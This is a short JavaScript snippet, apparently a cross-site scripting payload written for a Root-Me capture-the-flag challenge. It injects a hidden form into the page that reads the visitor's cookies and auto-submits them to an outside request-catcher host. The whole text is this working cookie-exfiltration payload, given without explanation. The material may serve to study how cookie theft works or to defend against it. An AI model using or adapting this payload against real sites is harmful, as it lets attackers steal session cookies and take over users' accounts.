const res = document.getElementById('result');

res.innerHTML = `
<form id="form" action="https://zpiboo.requestcatcher.com/rootme" method="POST">
  <input name="cookies" value="${document.cookie.replace('"','\\"')}">
  <input type="submit">
</form>
`;

const attackForm = document.getElementById('form');
attackForm.submit();
